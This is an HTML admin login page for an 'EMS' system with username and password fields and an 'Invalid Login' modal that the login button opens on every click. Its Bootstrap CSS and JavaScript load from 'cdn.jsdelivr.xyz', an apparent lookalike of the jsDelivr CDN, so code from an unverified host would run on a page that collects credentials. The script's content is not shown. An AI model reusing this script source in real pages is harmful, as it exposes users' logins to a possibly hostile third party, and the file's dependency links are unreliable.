<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EMS</title>
    <link
    rel="stylesheet"
    href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
    />
<script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>

 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="style.css">
</head>
<body class="bg-light">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-4">
                <div class="shadow-lg  mb-5 bg-body rounded">
                 <div class="card mt-5">
                    <div class="card-header text-bg-dark">Log in as admin</div>
                    <div class="card-body">
                        <form>
                            <div class="form-floating">
                                <input type="text" id="username" class="form-control mb-3" placeholder="User Name" autofocus autocomplete="off">
                                <label for="username">User Name</label>
                            </div>
                            <div class="form-floating">
                                <input type="password" id="password" class="form-control mb-3" placeholder="Password" autocomplete="off">
                                <label for="password">Password</label>
                            </div>
                            <div class="form-check mb-3">
                                <input type="checkbox" class="form-check-input" id="check">
                                <label for="check">Remember Me</label>
                            </div>
                            
                            <a id="login" style="text-decoration: none;">
                                <div class="d-grid">
                                    <button type="submit" data-bs-toggle="modal" data-bs-target="#modal1" class="btn btn-warning"><i class="fa-solid fa-right-to-bracket p-2"></i>Login as admin</button>
                                </div>
                            </a>



                            <div class="modal fade" id="modal1" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-bs-backdrop="static">
                                <div class="modal-dialog modal-dialog-centered">
                                    <div class="modal-content ">
                                        <div class="modal-header bg-white">
                                         <h20 class="modal-title fw-light fs-4" id="exampleModalLabe3"> <div class="text"><strong style="color: rgb(0, 0, 0);">Invalid Login please try again ..</strong></div></h20>
                                          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                        </div>
                              
                              
                                        <div class="modal-footer justify-content-center">
                                          <button type="button" class="btn btn-danger btn-lg" data-bs-dismiss="modal">OK!</button>
                                        </div>
                              
                                      </div>
                                </div>
                              </div>

                             

                        </form>
                    </div>
                 </div>
                </div>
            </div>
        </div>
    </div>
    
  <script src="./app.js"></script>
</body>
</html>
